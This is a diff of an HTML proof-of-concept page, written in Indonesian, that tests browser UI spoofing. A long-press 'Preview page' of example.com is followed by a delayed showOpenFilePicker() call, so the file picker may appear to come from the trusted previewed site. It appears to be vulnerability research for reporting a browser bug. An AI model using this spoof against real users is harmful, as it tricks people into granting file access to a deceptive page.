@@ -3,33 +3,35 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC — FSA picker via long-press + delay</title>
+<title>PoC — Preview Page anchor spoof</title>
 </head>
 <body>
-<h2>File Picker Origin Spoofing</h2>
+<h2>File Picker Spoof via "Preview page"</h2>
 <ol>
-  <li><b>Tekan lama</b> tautan di bawah → muncul menu.</li>
-  <li>Pilih <b>"Preview page / Pratinjau halaman"</b>.</li>
-  <li>Tunggu 3 detik — jangan sentuh apa pun.</li>
+  <li><b>Tekan lama</b> tautan di bawah.</li>
+  <li>Pilih <b>"Preview page / Pratinjau halaman"</b> (JANGAN "Open in new tab").</li>
+  <li>Preview <b>example.com</b> kebuka.</li>
+  <li>Tunggu 3 detik TANPA sentuh apa pun.</li>
+  <li>Amati: file picker muncul saat kamu lagi ngeliat example.com?</li>
 </ol>
 
 <a href="https://example.com" style="font-size:20px;">👉 Tekan lama tautan ini</a>
 
 <hr>
-<div id="status" style="font-weight:bold; padding:8px; border:1px solid #888; min-height:22px;">
-  status: menunggu long-press…
+<div id="status" style="font-weight:bold;padding:8px;border:1px solid #888;">
+status: menunggu long-press…
 </div>
 
 <script>
 const s = document.getElementById('status');
 document.addEventListener("contextmenu", () => {
-  s.textContent = '✅ contextmenu terdeteksi → tunggu 3 detik…';
+  s.textContent = '✅ contextmenu OK → pilih Preview page, tunggu 3s…';
   setTimeout(async () => {
     try {
-      const [h] = await window.showOpenFilePicker();
-      s.textContent = '🔴 PICKER TERBUKA! File: ' + (h ? h.name : '(dipilih)');
+      await window.showOpenFilePicker();
+      s.textContent = '🔴 PICKER TERBUKA saat preview trusted → SPOOF!';
     } catch (e) {
-      s.textContent = '🟢 diblokir — ' + e.name + ': ' + e.message;
+      s.textContent = '🟢 diblokir — ' + e.name;
     }
   }, 3000);
 });
